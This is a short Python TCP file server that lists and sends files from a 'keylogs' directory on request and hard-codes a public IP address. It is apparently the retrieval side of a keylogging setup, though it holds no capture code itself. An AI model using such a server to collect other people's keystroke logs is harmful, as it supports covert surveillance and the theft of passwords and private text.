#File Sever
import socket
import os
import fileinput
import sys

#setting up the server
tcp_port = 25006
buffer_size = 1024
serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = '35.231.244.179' #this used for local tests
serversocket.bind(('', tcp_port))

#listening for a connection and accepting it
print("Server started on " + host + " on port " + str(tcp_port) + "\n")
serversocket.listen()

def pull_file(decode_command):
    filename = decode_command[4:]
    #print("Looking for file...")
    if filename[0:1] == ".":
        sent_data = "failure"
        connection.send(sent_data.encode())
        return
    filename = ("./keylogs/" + filename)
    #print(filename)
    try:
        f = open (filename, 'rb')
        #print("Opened: " + filename + "\n")
        sent_data = "success"
        connection.send(sent_data.encode())
        l = f.read(buffer_size-3)
        while (l):
            l = ("con".encode() + l)
            connection.send(l)
            reply = connection.recv(buffer_size)
            if (reply.decode() == "received"):
                l = f.read(buffer_size-3)
            else: 
                break
        f.close()
        print("Completed file transfer.")
    except:
        sent_data = "failure"
        connection.send(sent_data.encode())
    finally:
        sent_data = ("eof").encode()
        connection.send(sent_data)
        

        

while(True):
    connection, address = serversocket.accept()
    print ('Connected to ', address)
    #displaying the directory
    print ('Sending directory information...')
    directory_data = os.listdir(path = './keylogs/')
    sent_data = "====Keylog Files====\n" + "\n".join(directory_data)
    connection.send(sent_data.encode())
    #now listen for a command from client
    while(True):
        command = connection.recv(buffer_size)
        decode_command = command.decode()
        #print(decode_command)
        keyword = command[0:4]
        #print(keyword)
        if keyword.decode() == "pull":
            pull_file(decode_command)
        elif keyword.decode() == "quit":
            break
        else:
            sent_data = "Command not understood.\n"
            connection.send(sent_data.encode())

    connection.close()

serversocket.close()